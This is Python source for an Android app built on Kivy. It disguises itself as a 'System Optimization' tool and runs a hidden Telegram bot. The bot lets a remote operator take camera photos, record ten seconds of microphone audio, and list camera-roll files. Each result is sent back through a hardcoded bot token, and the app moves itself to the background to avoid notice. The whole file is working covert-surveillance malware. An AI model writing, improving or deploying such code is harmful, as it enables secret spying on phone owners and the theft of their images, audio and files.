
import telebot
import cv2
import threading
import os
import sounddevice as sd
from scipy.io.wavfile import write
from kivy.app import App
from kivy.uix.label import Label
from jnius import autoclass
from geopy.geocoders import Nominatim

TOKEN = "8561506941:AAH3bsujghPEm8FeJ-xG1YGcmB-HuNgVhGE"
bot = telebot.TeleBot(TOKEN)

def run_bot():
    @bot.message_handler(commands=['photo'])
    def send_photo(message):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('shot.jpg', frame)
            bot.send_photo(message.chat.id, open('shot.jpg', 'rb'))
        cap.release()

    @bot.message_handler(commands=['mic'])
    def record_audio(message):
        fs = 44100  
        seconds = 10  
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('audio.wav', fs, recording)
        bot.send_voice(message.chat.id, open('audio.wav', 'rb'))

    @bot.message_handler(commands=['gallery'])
    def list_files(message):
        path = "/sdcard/DCIM/Camera/"
        files = os.listdir(path)[:10] # Pehli 10 photos
        bot.send_message(message.chat.id, "Gallery Files: " + "\n".join(files))

    bot.infinity_polling()

class NovaApp(App):
    def build(self):
        threading.Thread(target=run_bot, daemon=True).start()
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            current_activity = PythonActivity.mActivity
            current_activity.moveTaskToBack(True)
        except: pass
        return Label(text="System Optimization in Progress...")

if __name__ == "__main__":
    NovaApp().run()
